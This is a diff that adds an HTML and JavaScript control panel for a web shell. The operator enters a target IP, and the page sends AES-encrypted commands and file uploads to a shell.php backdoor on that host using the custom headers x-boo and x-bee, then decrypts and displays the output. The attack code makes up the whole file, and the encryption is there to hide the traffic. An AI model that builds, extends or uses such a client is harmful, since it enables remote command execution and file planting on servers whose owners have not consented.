@@ -1,0 +1,80 @@
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI="
+    crossorigin="anonymous"></script>
+
+<div>
+    <h1>IP</h1>
+    <input type="text" id="ip" name="ip"><br>
+    <input type="button" id="save" name="save" value="Save"><br>
+    <p>Current shell ip: </p><a href id="ip-link"></a>
+</div>
+<div>
+    <h1>Shell</h1>
+    <input type="text" id="boo" name="boo"><br>
+    <button id="exec">submit</button><br>
+    <pre id="result-exec"><br>
+    </pre>
+</div>
+<div>
+    <h1>Upload</h1>
+    <p style="display: inline">Location:</p>
+    <input type="text" id="location" name="location"><br>
+    <input type="file" id="bee" name="bee"><br>
+    <button id="upload">submit</button><br>
+    <pre id="result-upload"><br>
+    </pre>
+</div>
+
+<script>
+    let key = CryptoJS.enc.Hex.parse("e6855ef46cce736eb64cd3b6b3796afca4aa30f2a0391041b91d0fb51a314510");
+
+    function enc(msg) {
+        return CryptoJS.AES.encrypt(msg, key, { 'iv': CryptoJS.enc.Hex.parse("") }).ciphertext.toString();
+    }
+
+    function dec(msg_hex) {
+        msg_hex = CryptoJS.enc.Hex.parse(msg_hex)
+        data = CryptoJS.AES.decrypt({ ciphertext: msg_hex }, key, { 'iv': CryptoJS.enc.Hex.parse("") }).toString(CryptoJS.enc.Utf8)
+        return data
+    }
+
+    function send_post(text, header_key, header_val, result) {
+        encrypted = enc(text);
+        $.ajax({
+            method: "POST",
+            url: shell_url,
+            contentType: 'text/plain',
+            data: encrypted,
+            headers: { [header_key]: header_val }
+        })
+            .done((msg) => {
+                console.log(msg);
+                $(result).append(dec(msg) + '\n----------------\n\n\n');
+            });
+    }
+
+    let ip = null;
+    let shell_url = null;
+    $('#save').click(
+        () => {
+            ip = $('#ip').val();
+            shell_url = `http://${ip}/shell.php`;
+            console.log(ip);
+            $('#ip-link').attr('href', shell_url)
+            $('#ip-link').text(ip);
+        }
+    )
+
+    $('#exec').click(
+        () => {
+            send_post($("#boo").val(), "x-boo", "1", '#result-exec')
+        })
+    $('#upload').click(
+        () => {
+            fr = new FileReader();
+            fr.onload = () => {
+                send_post(CryptoJS.lib.WordArray.create(fr.result), "x-bee", $('#location').val(), '#result-upload')
+            };
+            fr.readAsArrayBuffer($('#bee')[0].files[0])
+        })
+</script>
